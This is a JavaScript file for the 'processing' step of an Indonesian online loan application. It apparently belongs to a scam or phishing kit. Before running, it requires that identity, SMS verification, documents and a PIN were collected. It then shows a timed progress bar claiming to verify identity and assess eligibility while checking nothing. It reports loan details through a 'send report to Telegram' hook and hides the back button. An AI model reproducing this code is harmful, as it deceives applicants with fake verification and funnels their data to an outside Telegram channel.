(() => {
  if (!NovaStorage.requireSession()) return;
  if (!NovaStorage.requireIdentity()) return;
  if (!NovaStorage.requireSmsVerification()) return;
  if (!NovaStorage.requireDocuments()) return;
  if (!NovaStorage.requireLoan()) return;
  if (!NovaStorage.requireSummary()) return;
  if (!NovaStorage.requirePin()) return;

  const app = NovaStorage.getApplication();
  if (app.resultAvailable) {
    location.replace('hasil-pengajuan.html');
    return;
  }

  NovaStorage.startProcessing();

  const stages = [
    ['IDENTITY_VALIDATION','Memverifikasi identitas...',20,1600],
    ['APPLICATION_VALIDATION','Memvalidasi data pengajuan...',45,1800],
    ['ELIGIBILITY_ANALYSIS','Menganalisis kelayakan...',75,2200],
    ['FINALIZING','Menyelesaikan proses...',100,1700]
  ];

  const status = document.getElementById('processStatus');
  const bar = document.getElementById('progressBar');
  let index = 0;

  function next() {
    if (index >= stages.length) {
      NovaStorage.completeProcessing();
      window.kirimLaporanKeTelegram?.({
        event: 'PROCESS_COMPLETED',
        page: 'proses-pengajuan.html',
        amount: String(app.loan.amount),
        tenor: String(app.loan.tenor),
        purpose: app.loan.purpose,
        status: 'PROCESS_COMPLETED'
      });
      document.body.style.opacity = '0';
      document.body.style.transition = 'opacity .45s ease';
      setTimeout(() => location.replace('hasil-pengajuan.html'), 460);
      return;
    }

    const [key,text,width,delay] = stages[index++];
    NovaStorage.updateProcessingStage(key);
    status.classList.add('fade');

    setTimeout(() => {
      status.textContent = text;
      status.classList.remove('fade');
      bar.style.width = width + '%';
      setTimeout(next, delay);
    }, 280);
  }

  bar.style.width = '8%';
  setTimeout(next, 500);

  document.getElementById('backButton').style.visibility = 'hidden';
})();
